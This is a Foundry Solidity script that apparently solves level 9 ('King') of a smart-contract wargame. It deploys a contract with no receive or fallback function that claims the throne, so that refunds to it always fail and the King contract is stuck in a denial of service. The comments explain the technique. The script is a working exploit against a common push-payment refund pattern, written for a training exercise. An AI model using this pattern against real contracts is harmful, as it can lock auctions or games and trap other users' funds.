// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {King} from "../src/level9.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice withdrawal DoS, (receiver cannot receive)
contract Level9Solution is Script {
    King public level = King(payable(0x1e90543b2C6cA406Bf7dC0ccAD5Ea086645b347F));

 
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // The general idea is to prevent the contract from sending ether back to you.
        // which causes a DoS as it will always fail and the king will remain the same.
        // The reason you need another contract is because if you send directly,
        // you are using an EOA which can receive ether, while contract account can't.
        new BadKing(level);
        console.log("King: ", level._king());

        vm.stopBroadcast();
    }

}

contract BadKing {
    constructor(King _level) payable {
        (bool result,) = address(_level).call{value: _level.prize()}("");
        require(result);
    }

    // This contract does not have a fallback() or receive() function, hence it cannot receive ether
}


